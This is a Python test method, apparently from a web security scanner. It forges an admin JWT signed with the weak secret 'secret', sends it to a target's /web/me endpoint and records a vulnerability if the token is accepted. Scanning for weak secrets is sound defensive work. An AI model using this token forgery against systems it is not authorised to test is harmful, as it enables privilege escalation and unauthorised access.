    def test_cat305_weak_secret_web(self):
        """JWT: JWT signed with weak secret accepted at /web/me.."""
        if not self.deep: return
        self._print("[*]", "test_cat305_weak_secret_web...", "INFO")
        try:
            hdr = {"alg": "HS256", "typ": "JWT"}
            hb = base64.urlsafe_b64encode(json.dumps(hdr, separators=(",", ":")).encode()).rstrip(b"=")
            pl = {"sub": "admin", "role": "admin"}
            pb = base64.urlsafe_b64encode(json.dumps(pl, separators=(",", ":")).encode()).rstrip(b"=")
            key = b"secret"
            block = 64
            kk = key if len(key) <= block else hashlib.sha256(key).digest()
            kk = kk + b"\x00" * (block - len(kk))
            inner = hashlib.sha256(bytes(c ^ 54 for c in kk) + hb + b"." + pb).digest()
            sig = base64.urlsafe_b64encode(hashlib.sha256(bytes(c ^ 92 for c in kk) + inner).digest()).rstrip(b"=").decode()
            tok = hb.decode() + "." + pb.decode() + "." + sig
            u = urljoin(self.target, "/web/me")
            r = self._get(u, timeout=8, headers={"Authorization": "Bearer " + tok})
            if r is not None and getattr(r, "status_code", 0) in (200, 201):
                self._add_vuln("JWT Weak Secret", "HIGH", u, "JWT signed with weak secret accepted", token=tok[:80])
        except Exception:
            pass

